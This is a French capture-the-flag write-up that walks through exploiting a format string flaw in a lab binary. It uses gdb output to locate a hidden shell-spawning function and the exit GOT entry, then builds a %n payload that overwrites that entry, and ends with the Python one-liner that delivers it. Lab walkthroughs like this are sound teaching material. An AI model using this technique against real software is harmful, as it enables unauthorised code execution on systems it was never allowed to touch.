# Format String Exploitation

En décompilant l'exécutable, on se rend compte qu'il fait appel à la fonction `printf` puis, dans un second temps, à `exit`. On remarque aussi la présence d'une fonction `o` qui n'est jamais appelée et qui semble lancer un appel `system` avec `"/bin/sh"` en argument.

L'objectif est donc d'utiliser `printf` pour tenter de faire appel à la fonction `o`. La solution que nous avons trouvé est de remplacer l'adresse de la fonction `exit`, par l'adresse  de la fonction `o`.

Il nous faut d'abord trouver l'adresse de ces deux fonctions. En utilisant `gdb`, on exécute :
```
> gdb level5
[...]
```

---
**Adresse de `o`**

```
> (gdb) x o
0x80484a4 <o>:	0x83e58955
```
L'adresse de la fonction `o` est `0x80484a4`

**Adresse de `exit`**

Pour trouver l'adresse de `exit`, on va trouver l'endroit ou le programme y fait appel.
```
> (gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	    push   %ebp
   0x080484c3 <+1>:	    mov    %esp,%ebp
   0x080484c5 <+3>:	    sub    $0x218,%esp
   0x080484cb <+9>:	    mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```
`call` étant une instruction raccourcie, on va désassembler cette instruction :
```
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	    jmp    *0x8049838
   0x080483d6 <+6>:	    push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
```
On remarque que ce `call` fait un `jump` à l'adresse `0x8049838`, qui est en fait l'adresse de `exit`.

L'adresse de `exit` est donc `0x8049838`.

---

À chaque utilisation de la faille `format string`, il est important de connaitre l'emplacement mémoire exact où `printf` écrit pour exploiter cette écriture.

Pour cela, on `break` sur l'instruction suivant l'appel à `printf`.
```
> (gdb) b *0x080484f8
[...]
```
On `run` puis on fourni en entrée standard 4 caractères `A` ainsi que `%1$p` qui vas nous permettre d'imprimer le premier argument de `printf`.
```
> (gdb) r
AAAA%p
AAAA0x200
```
Nous savons donc que le contenu du premier argument de `printf` est `0x200`. 

Nous allons maintenant determiner à quelle adresse a été écrite notre chaine de caractère par rapport au premier argument de `printf`.
```
printf_offset = adresse_buffer - adresse_1er_argument
```

---

**Adresse du premier argument**

En imprimant les premiers registres depuis `esp`, on est capable de retrouver notre premier argument affiché par notre `printf` précédement.
```
> (gdb) x/10wx $esp
0xbffff500:	0xbffff510	0x00000200	0xb7fd1ac0	0xb7ff37d0
                        ^
                        1er argument
0xbffff510:	0x70243125	0xb7e2000a	0x00000001	0xb7fef305
0xbffff520:	0xbffff578	0xb7fde2d4
```
Notre premier argument est donc stocké à l'adresse de `esp+0x04`.
```
> (gdb) x $esp+0x04
0xbffff504:	0x00000200
```
L'adresse du premier argument est `0xbffff504`.

**Adresse du `buffer`**

L'adresse du buffer est contenue dans le premier registre pointé par `esp`.
```
> (gdb) x $esp
0xbffff500:     0xbffff510
> (gdb) x 0xbffff510
0xbffff510:	    0x41414141
```
L'adresse du `buffer` est `0xbffff510`.

--- 

On peut donc remplacer les inconnues de notre équation :
```
printf_offset = adresse_buffer - adresse_1er_argument
              = 0xbffff510 - 0xbffff504
              = 0xc
              = 12 (base 10)
```
On divise notre résultat par `4` car chaque registre contient 4 octets. Puis on ajoute `1` pour pointer sur notre `buffer` :
```
12 / 4 + 1 = 4
```
Nous allons devoir utiliser le `4ème` argument de `printf`.

On reprend ensuite la même logique que le `level3`. De manière abstraite, voici comment nous allons construire notre commande :
```
[adresse_exit] [adresse_o - 4] [%4$n]
^              ^
4 octets       adresse_o
               octets
```

Nous écrivons l'adresse de `exit` avec la notation `little-endian` :
```
\x38\x98\x04\x08
```
Nous pouvons écrire un grand nombre de caractère sans risquer un `overflow` grace au modifier `%d`. Donner un nombre en modifier à `%d` permet d'imprimer un `buffer` qui ne sera pas stocké dans la stack.
```
adresse_o = 0x080484a4
          = 134513828
```
On retire `4` en raison des `4` octets affichés précédement.
```
134513828 - 4 = 134513824
```
```
%134513824d
```
Enfin on indique à `printf` d'imprimer le nombre de caractère écrit à l'adresse de `exit` avec le modifier `%n`. L'adresse de `exit` étant stockée dans le `4ème` argument :
```
%4$n
```
Notre chaine de caractères à envoyer au programme sera la suivante :
```
"\x38\x98\x04\x08" + "%134513824d" + "%4$n"
```
On exécute donc :
```
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/command
```
```
cat /tmp/command - | ./level5
```
